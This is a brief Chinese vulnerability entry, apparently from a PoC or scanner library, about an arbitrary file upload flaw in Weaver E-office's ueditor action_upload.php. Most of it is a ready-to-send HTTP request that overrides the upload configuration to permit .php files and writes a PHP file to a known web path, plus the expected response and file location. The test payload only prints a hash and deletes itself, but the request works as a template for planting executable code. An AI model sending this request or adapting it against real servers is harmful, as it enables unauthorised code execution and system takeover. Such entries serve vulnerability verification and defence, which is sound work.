﻿# 泛微 E-office action_upload.php 存在文件上传漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：上海泛微网络科技股份有限公司E-office action_upload.php 存在文件上传漏洞，攻击者可利用该漏洞获取系统权限。

> 漏洞特征：

> 验证脚本：HTTP

```
POST /newplugins/js/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=/newplugins/js/ueditor/php/test/dude&CONFIG[imageMaxSize]=10000&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=yourfile HTTP/1.1
Content-Type: multipart/form-data; boundary=47a2054386f8c27b5f1ad264348b2977

--47a2054386f8c27b5f1ad264348b2977
Content-Disposition: form-data; name="yourfile"; filename="yourfile.php"

<?php echo md5(\'123456\');@unlink(__file__);?>
--47a2054386f8c27b5f1ad264348b2977--
```

> 响应代码特征：-1

> 响应内容特征：

> 上传文件定位：/newplugins/js/ueditor/php/test/yourfile.php

> 验证文件来源：泛微 E-office action_upload.php 存在文件上传漏洞.poc
